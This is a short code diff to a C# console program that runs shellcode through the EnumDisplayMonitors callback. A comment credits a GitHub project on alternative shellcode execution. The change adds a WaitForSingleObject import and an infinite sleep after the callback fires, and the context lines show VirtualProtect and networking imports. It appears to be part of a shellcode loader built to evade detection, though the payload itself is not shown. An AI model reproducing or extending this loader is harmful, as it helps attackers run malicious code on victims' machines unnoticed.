@@ -1,3 +1,5 @@
+
+//Alternative code exec. from c---> c# https://github.com/aahmad097/AlternativeShellcodeExec/blob/master/EnumDisplayMonitors/EnumDisplayMonitors.cpp
 using System.Net;
 using System.Runtime.InteropServices;
 
@@ -5,6 +7,9 @@ namespace ConsoleApp
 {
     class Program
     {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
@@ -49,6 +54,7 @@ namespace ConsoleApp
 
                 // Invoke the EnumDisplayMonitors function with the callback delegate
                 EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, callback, IntPtr.Zero);
+                Thread.Sleep(Timeout.Infinite);
             }
         }
     }
